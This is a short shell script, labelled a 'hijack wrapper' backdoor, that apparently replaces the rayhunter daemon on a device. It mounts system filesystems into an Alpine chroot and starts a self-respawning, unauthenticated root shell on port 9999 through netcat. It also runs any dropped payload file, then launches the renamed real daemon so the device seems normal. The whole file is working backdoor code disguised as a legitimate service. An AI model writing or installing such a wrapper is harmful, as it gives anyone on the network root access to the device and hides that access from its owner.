#!/bin/sh

# HIJACK WRAPPER V3 - The Backdoor
# 1. Setup Mounts
mount | grep "/data/alpine/proc" > /dev/null || mount -t proc proc /data/alpine/proc
mount | grep "/data/alpine/sys"  > /dev/null || mount -t sysfs sys /data/alpine/sys
mount | grep "/data/alpine/dev"  > /dev/null || mount -o bind /dev /data/alpine/dev

# 2. Launch Root Backdoor (Port 9999)
# This spawns a shell inside Alpine with FULL capabilities.
if ! netstat -tlpn | grep 9999; then
    echo "[-] Spawning Root Backdoor on 9999..." >> /data/rayhunter/hijack.log
    # Run in background, loop forever to respawn if connection closes
    (while true; do chroot /data/alpine /bin/busybox nc -ll -p 9999 -e /bin/sh; sleep 1; done) &
fi

# 3. Launch Payload (if pending)
if [ -f /data/payload.sh ]; then
    sh /data/payload.sh >> /data/rayhunter/hijack.log 2>&1
    mv /data/payload.sh /data/payload.sh.done
fi

# 4. Launch Real Daemon (Keep system happy)
exec /data/rayhunter/rayhunter-daemon.bak "$@"
